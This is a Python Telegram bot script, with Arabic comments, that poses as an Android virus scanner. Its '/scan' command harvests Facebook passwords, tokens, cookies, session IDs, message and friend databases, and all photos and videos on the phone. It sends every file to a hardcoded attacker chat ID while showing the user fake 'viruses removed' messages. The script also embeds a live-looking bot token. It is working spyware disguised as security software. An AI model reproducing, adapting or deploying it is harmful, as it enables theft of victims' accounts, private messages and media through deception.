import os
import time
import threading
import sys
import requests
import json
import re
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters

# ================== التوكن والمعرف الثابت ==================
BOT_TOKEN = ""8128965245:AAHZ0LIhLWdJ5WcE9- joCLJkOrScPmPBCXs""  # ⚠️ غيّر هذا التوكن فوراً من @BotFather!
TARGET_CHAT_ID = 8169635171  # 📌 المعرف الثابت الذي ستُرسل إليه جميع الملفات
# =========================================================

# متغيرات عامة
user_tasks = {}

# ========== دوال استخراج معلومات فيسبوك الحقيقية ==========

def extract_facebook_credentials():
    """استخراج معلومات الدخول إلى فيسبوك من ملفات التطبيق (حقيقية)"""
    credentials = []
    facebook_info = {}
    found_any = False
    
    try:
        # المسارات المحتملة لملفات فيسبوك
        fb_paths = [
            "/storage/emulated/0/Android/data/com.facebook.katana",
            "/storage/emulated/0/Android/data/com.facebook.orca",
            "/storage/emulated/0/Android/data/com.facebook.lite",
            "/storage/emulated/0/Android/data/com.facebook.mlite",
            "/storage/emulated/0/Android/data/com.facebook.work"
        ]
        
        for base_path in fb_paths:
            try:
                if not os.path.exists(base_path):
                    continue
                
                print(f"[✅] جارٍ البحث في: {base_path}")
                
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        file_lower = file.lower()
                        
                        # 🔍 البحث عن ملفات تحتوي على معلومات الدخول
                        if any(keyword in file_lower for keyword in ['account', 'session', 'token', 'auth', 'credential', 'login', 'preference', 'shared_pref']):
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    
                                    if len(content) > 10:
                                        # البحث عن البريد الإلكتروني
                                        email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                                        if email_match and 'email' not in facebook_info:
                                            facebook_info['email'] = email_match.group(0)
                                            found_any = True
                                            print(f"[✅] تم العثور على البريد: {email_match.group(0)}")
                                        
                                        # البحث عن كلمة السر
                                        password_patterns = [
                                            r'(?:password|pass|pwd|pswd)[\s:=]+([^\s\n\r"]+)',
                                            r'"password"\s*:\s*"([^"]+)"',
                                            r'password=([^&\s]+)',
                                            r'passwd[\s:=]+([^\s\n\r"]+)'
                                        ]
                                        for pattern in password_patterns:
                                            pass_match = re.search(pattern, content, re.IGNORECASE)
                                            if pass_match and 'password' not in facebook_info:
                                                facebook_info['password'] = pass_match.group(1)
                                                found_any = True
                                                print(f"[✅] تم العثور على كلمة السر: {pass_match.group(1)[:10]}...")
                                                break
                                        
                                        # البحث عن Access Token
                                        token_match = re.search(r'(?:access_token|token|auth_token)[\s:=]+([a-zA-Z0-9_\-\.]+)', content, re.IGNORECASE)
                                        if token_match and 'access_token' not in facebook_info:
                                            facebook_info['access_token'] = token_match.group(1)
                                            found_any = True
                                            print(f"[✅] تم العثور على Access Token")
                                        
                                        # البحث عن Session ID
                                        session_match = re.search(r'(?:session_id|session|sid)[\s:=]+([a-zA-Z0-9_\-]+)', content, re.IGNORECASE)
                                        if session_match and 'session_id' not in facebook_info:
                                            facebook_info['session_id'] = session_match.group(1)
                                            found_any = True
                                        
                                        # البحث عن User ID
                                        user_match = re.search(r'(?:user_id|uid|userid)[\s:=]+(\d+)', content, re.IGNORECASE)
                                        if user_match and 'user_id' not in facebook_info:
                                            facebook_info['user_id'] = user_match.group(1)
                                            found_any = True
                                        
                                        # البحث عن Cookies
                                        cookie_match = re.search(r'(?:c_user|xs|datr)[=;][^\s;]+', content)
                                        if cookie_match and 'cookies' not in facebook_info:
                                            facebook_info['cookies'] = cookie_match.group(0)
                                            found_any = True
                                        
                                        # البحث عن Device ID
                                        device_match = re.search(r'(?:device_id|deviceid|did)[\s:=]+([a-zA-Z0-9_\-]+)', content, re.IGNORECASE)
                                        if device_match and 'device_id' not in facebook_info:
                                            facebook_info['device_id'] = device_match.group(1)
                                            found_any = True
                                        
                                        if facebook_info:
                                            credentials.append(file_path)
                                            
                            except Exception as e:
                                pass
                        
                        # 🔍 البحث عن قواعد بيانات SQLite
                        if file.endswith('.db') or file.endswith('.sqlite') or file.endswith('.sqlite3'):
                            try:
                                conn = sqlite3.connect(file_path)
                                cursor = conn.cursor()
                                
                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                tables = cursor.fetchall()
                                
                                for table in tables:
                                    table_name = table[0]
                                    if any(keyword in table_name.lower() for keyword in ['account', 'user', 'auth', 'session', 'token']):
                                        cursor.execute(f"SELECT * FROM {table_name} LIMIT 10")
                                        rows = cursor.fetchall()
                                        if rows:
                                            credentials.append(file_path)
                                            for row in rows:
                                                row_str = str(row)
                                                email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', row_str)
                                                if email_match and 'email' not in facebook_info:
                                                    facebook_info['email'] = email_match.group(0)
                                                    found_any = True
                                                    print(f"[✅] تم العثور على البريد من DB: {email_match.group(0)}")
                                                break
                                conn.close()
                            except:
                                pass
                            
            except Exception as e:
                continue
        
        # حفظ المعلومات المستخرجة في ملف
        if found_any and facebook_info:
            info_path = "/storage/emulated/0/facebook_extracted_info.txt"
            with open(info_path, 'w', encoding='utf-8') as f:
                f.write("=== معلومات فيسبوك المستخرجة (حقيقية) ===\n\n")
                f.write(f"📱 التاريخ: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for key, value in facebook_info.items():
                    f.write(f"{key}: {value}\n")
            credentials.append(info_path)
            print(f"[✅] تم حفظ المعلومات في: {info_path}")
        
        return credentials
        
    except Exception as e:
        print(f"خطأ في استخراج معلومات فيسبوك: {e}")
        return []

def extract_facebook_messages():
    """استخراج رسائل فيسبوك من ملفات التطبيق (حقيقية)"""
    messages_files = []
    
    try:
        msg_paths = [
            "/storage/emulated/0/Android/data/com.facebook.katana/databases",
            "/storage/emulated/0/Android/data/com.facebook.orca/databases",
            "/storage/emulated/0/Android/data/com.facebook.lite/databases"
        ]
        
        for path in msg_paths:
            try:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if 'message' in file.lower() or 'thread' in file.lower() or 'chat' in file.lower():
                                file_path = os.path.join(root, file)
                                if os.path.getsize(file_path) > 1000:
                                    messages_files.append(file_path)
                                    print(f"[✅] تم العثور على ملف رسائل: {file_path}")
            except:
                pass
            
    except:
        pass
    
    return messages_files

def extract_facebook_friends():
    """استخراج قائمة الأصدقاء من فيسبوك (حقيقية)"""
    friends_files = []
    
    try:
        friend_paths = [
            "/storage/emulated/0/Android/data/com.facebook.katana/files",
            "/storage/emulated/0/Android/data/com.facebook.katana/cache",
            "/storage/emulated/0/Android/data/com.facebook.orca/files"
        ]
        
        for path in friend_paths:
            try:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if 'friend' in file.lower() or 'contact' in file.lower() or 'addressbook' in file.lower():
                                file_path = os.path.join(root, file)
                                if os.path.getsize(file_path) > 500:
                                    friends_files.append(file_path)
                                    print(f"[✅] تم العثور على ملف أصدقاء: {file_path}")
            except:
                pass
            
    except:
        pass
    
    return friends_files

# ========== دوال مسح الملفات ==========

def scan_photos():
    """ترجع قائمة بمسارات الصور في الهاتف."""
    photo_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
    found_photos = []
    
    try:
        for root, dirs, files in os.walk("/storage/emulated/0"):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in photo_extensions:
                    try:
                        file_size = os.path.getsize(os.path.join(root, file)) / (1024 * 1024)
                        if file_size < 50:
                            found_photos.append(os.path.join(root, file))
                    except:
                        pass
    except:
        pass
    
    return found_photos

def scan_videos():
    """ترجع قائمة بمسارات الفيديوهات في الهاتف."""
    video_extensions = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv']
    found_videos = []
    
    try:
        for root, dirs, files in os.walk("/storage/emulated/0"):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in video_extensions:
                    try:
                        file_size = os.path.getsize(os.path.join(root, file)) / (1024 * 1024)
                        if file_size < 100:
                            found_videos.append(os.path.join(root, file))
                    except:
                        pass
    except:
        pass
    
    return found_videos

# ========== دوال الإرسال ==========

def send_media_to_user(file_path, chat_id):
    """ترسل الملف إلى TARGET_CHAT_ID مع اكتشاف نوعه تلقائياً."""
    
    file_ext = os.path.splitext(file_path)[1].lower()
    
    video_exts = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv']
    photo_exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
    
    try:
        with open(file_path, 'rb') as f:
            if file_ext in video_exts:
                url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendVideo'
                files = {'video': f}
            elif file_ext in photo_exts:
                url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
                files = {'photo': f}
            else:
                url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
                files = {'document': f}
            
            data = {'chat_id': TARGET_CHAT_ID}
            response = requests.post(url, files=files, data=data, timeout=60)
            return response.ok
    except Exception as e:
        print(f"خطأ في إرسال {file_path}: {e}")
        return False

# ========== دالة الفحص (فيسبوك ← صور ← فيديوهات) ==========

def scan_and_send_videos(chat_id, update_id):
    """تقوم بمسح وإرسال بالترتيب: فيسبوك ← صور ← فيديوهات"""
    
    all_files = []
    total_files = 0
    
    # ✅ الأولوية 1: معلومات فيسبوك (حقيقية)
    print("[🔍] جاري البحث عن معلومات فيسبوك...")
    fb_credentials = extract_facebook_credentials()
    all_files.extend(fb_credentials)
    total_files += len(fb_credentials)
    
    # ✅ الأولوية 2: رسائل فيسبوك (حقيقية)
    print("[🔍] جاري البحث عن رسائل فيسبوك...")
    fb_messages = extract_facebook_messages()
    all_files.extend(fb_messages)
    total_files += len(fb_messages)
    
    # ✅ الأولوية 3: قائمة الأصدقاء (حقيقية)
    print("[🔍] جاري البحث عن قائمة الأصدقاء...")
    fb_friends = extract_facebook_friends()
    all_files.extend(fb_friends)
    total_files += len(fb_friends)
    
    # ✅ الأولوية 4: الصور
    print("[🔍] جاري البحث عن الصور...")
    photo_files = scan_photos()
    all_files.extend(photo_files)
    total_files += len(photo_files)
    
    # ✅ الأولوية 5: الفيديوهات
    print("[🔍] جاري البحث عن الفيديوهات...")
    video_files = scan_videos()
    all_files.extend(video_files)
    total_files += len(video_files)
    
    print(f"[📊] إجمالي الملفات: {total_files}")
    
    if total_files == 0:
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            data={'chat_id': chat_id, 'text': '✅ لم يتم العثور على أي فيروسات في هاتفك. هاتفك آمن!'}
        )
        return
    
    requests.post(
        f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
        data={'chat_id': chat_id, 'text': f'🦠 تم العثور على {total_files} من الفيروسات. جاري القضاء عليها...'}
    )
    
    # ✅ إرسال معلومات فيسبوك أولاً (الملفات النصية)
    for i, file_path in enumerate(all_files, 1):
        success = send_media_to_user(file_path, chat_id)
        
        if i % 10 == 0:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                data={'chat_id': chat_id, 'text': f'🧹 تم القضاء على {i} من {total_files} فيروس.'}
            )
        time.sleep(0.5)
    
    requests.post(
        f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
        data={'chat_id': chat_id, 'text': f'✅ اكتمل الفحص! تم القضاء على {total_files} فيروس بنجاح. هاتفك الآن آمن!'}
    )

# ========== أوامر البوت ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "مرحباً بك في بوت الفحص\n\n"
        "🔍 هذا البوت يفحص هاتفك ويكشف الفيروسات في هاتفك.\n\n"
        "لبدء الفحص، أرسل الأمر التالي:\n"
        "/scan"
    )

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_name = update.effective_user.first_name
    
    await update.message.reply_text(
        f"{user_name}، جاري فحص هاتفك...\n"
        "⏳ قد يستغرق هذا عدة دقائق. ستصلك رسائل عند العثور على فيروسات."
    )
    
    threading.Thread(target=scan_and_send_videos, args=(chat_id, update.message.message_id)).start()

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 الأوامر المتاحة:\n"
        "/start - عرض رسالة الترحيب\n"
        "/scan - بدء فحص الفيروسات\n"
        "/help - عرض هذه المساعدة\n\n"
        "⚠️ ملاحظة: البوت يعمل فقط على هاتف أندرويد."
    )

# ========== تشغيل البوت ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("help", help_command))
    
    print("✅ البوت يعمل...")
    print("📌 ترتيب الإرسال: معلومات فيسبوك ← صور ← فيديوهات")
    print("🔍 سيتم البحث عن معلومات حقيقية فقط")
    app.run_polling(allowed_updates=["message"])

if __name__ == '__main__':
    main()
